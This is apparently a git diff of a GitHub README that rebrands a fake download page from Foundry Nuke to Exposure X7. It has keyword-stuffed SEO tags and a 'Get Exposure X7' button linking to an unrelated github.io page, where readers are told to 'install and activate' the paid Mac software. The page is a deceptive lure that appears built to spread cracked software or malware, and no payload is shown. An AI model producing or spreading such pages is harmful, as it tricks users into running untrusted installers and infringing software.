@@ -1,12 +1,12 @@
-# Foundry Nuke – Professional VFX Compositing & Post-Production Suite
+# Exposure X7 – Professional RAW Editor & Film Emulation Suite
 <div align="center">
-  <img src="https://www.foundry.com/sites/default/files/2021-03/ICON_NUKE-rgb-yellow-01.png" width="250"/>
+  <img src="https://exposure.software/site/wp-content/uploads/2021/08/Exposure-X7-new-release.png" width="550"/>
 </div>
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/foundry">
-    <img src="https://img.shields.io/badge/Get%20Foundry%20Nuke-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Foundry Nuke">
+  <a href="https://osx-quick-app.github.io/.github/exposure">
+    <img src="https://img.shields.io/badge/Get%20Exposure%20X7-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Exposure X7">
   </a>
 </p>
 
@@ -14,23 +14,23 @@
 
 # Installation Instructions
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Foundry Nuke On Your Mac Device.
+2. Follow The On-Screen Steps To Install And Activate Exposure X7 On Your Mac Device.
 
 ---
 
 <div align="center">
-  <img src="https://macmy.ru/uploads/posts/2015-04/1429174230_d93xyj.jpg" width="1080"/>
+  <img src="https://insmac.org/uploads/posts/2021-09/1632843734_exposure-x7_02.jpg" width="1080"/>
 </div>
 <br>
 
-## 🎬 Overview
-**Foundry Nuke** is an industry-standard VFX compositing platform trusted by leading studios for high-end film, television, and commercial production.  
-It offers a robust, node-based workflow that gives artists precise control over visual effects, color, lighting, and integration of CG elements into live-action footage.  
+## 🎞️ Overview
+**Exposure X7** by *Exposure Software* reimagines professional photo editing through precision tools and the warmth of classic film aesthetics.  
+It unites non-destructive RAW processing, advanced masking, and refined color grading in a single, fluid workspace designed for creative photographers.  
 
-With **Nuke Studio**, artists can handle compositing, editorial, and finishing tasks within one unified environment, allowing for seamless collaboration between departments.  
-From feature films to advertising, **Nuke** delivers the flexibility and power needed to achieve photo-realistic results — from advanced rotoscoping and keying to 3D tracking and deep compositing.  
+Built with performance and artistry in mind, **Exposure X7** eliminates the need for catalog management, giving you direct access to folders and files while maintaining full editing flexibility.  
+Its unique film emulation engine accurately replicates the tones and textures of legendary analog film, helping you achieve cinematic results with ease.  
 
-Optimized for macOS, Nuke integrates perfectly into modern production pipelines and supports major 3D software such as Maya, Houdini, and Blender, making it a cornerstone of professional post-production.
+From portrait retouching and landscape adjustments to double-exposure effects, **Exposure X7** provides everything needed to transform photos into expressive visual stories.
 
 ---
 
@@ -38,12 +38,12 @@ Optimized for macOS, Nuke integrates perfectly into modern production pipelines 
 
 | Feature | Description |
 |-------------------------------------|------------------------------------------------------------------------------|
-| 🧩 **Node-Based Compositing** | Create, connect, and modify layers with a non-destructive workflow. |
-| 🎨 **Powerful Color Management** | Utilize HDR, ACES, and deep color tools for cinematic accuracy. |
-| 🧠 **3D Workspace Integration** | Combine live-action plates and 3D geometry within one environment. |
-| 🎥 **Editorial & Timeline Tools** | Edit, conform, and review sequences directly inside Nuke Studio. |
-| 💡 **Advanced Rotoscoping & Keying** | Cleanly separate foreground and background with precise edge detail. |
-| ⚙️ **Pipeline & Rendering Support** | Integrates with Maya, Houdini, Arnold, Redshift, and other VFX tools. |
+| 🎨 **Authentic Film Simulations** | Emulate the look of vintage film stocks like Kodak, Fujifilm, and Ilford. |
+| 🧠 **Smart Masking Tools** | Intelligently detect people, objects, and skies for detailed selective edits. |
+| 🧩 **Non-Destructive Editing** | Make limitless adjustments without altering original image data. |
+| 📸 **High-Precision RAW Engine** | Deliver crisp details, accurate color, and perfect tonal transitions. |
+| 💡 **Intuitive Tone Control** | Fine-tune exposure, contrast, and lighting with adaptive sliders. |
+| ⚙️ **Streamlined Workflow** | Catalog-free browsing, folder-based editing, and lightning-fast previews. |
 
 ---
 
@@ -53,12 +53,11 @@ Optimized for macOS, Nuke integrates perfectly into modern production pipelines 
 |---------------|-----------------------------------|
 | OS | macOS 11.0 or later |
 | Processor | Apple Silicon (M1/M2) or Intel |
-| Memory | 16 GB RAM (32 GB recommended) |
-| Storage | 3 GB free disk space |
-| GPU | Metal-compatible GPU with 4 GB VRAM |
+| Memory | 8 GB RAM (16 GB recommended) |
+| Storage | 2 GB free disk space |
 | Display | 1440×900 resolution or higher |
 
 ---
 
 ## 🏷️ Tags
-foundry nuke • nuke vfx • nuke compositing • nuke vfx software • nuke studio • nuke mac • the foundry nuke studio • foundry nuke mac • nuke studio mac • arnold maya nuke intro to 3d rendering live action vfx • autodesk nuke • nuke vfx mac • foundry nuke certification • foundry nuke course • foundry nuke price • foundry nuke studio • foundry nukex • nuke compositing training • nuke 13.2 • nuke studio price • nuke vfx compositing • nuke vfx price
+exposure • exposures • exposure software • exposure software mac • exposure mac • exposure x7 mac • double exposure • kodak ultramax 400 • kodak single use camera • exposure meter • exposure meaning in urdu • photography light meter • ultramax 400 • kodak ultramax • double exposure polaroid • double exposure film • exposurex7 • exposure camera • multi exposure photography • low exposure • over exposure • fujifilm fujicolor superia x tra 400 • alien skin exposure • alienskin software • auto exposure • exposure 7 • exposure control • exposure x • xposure photography • over exposure in photography
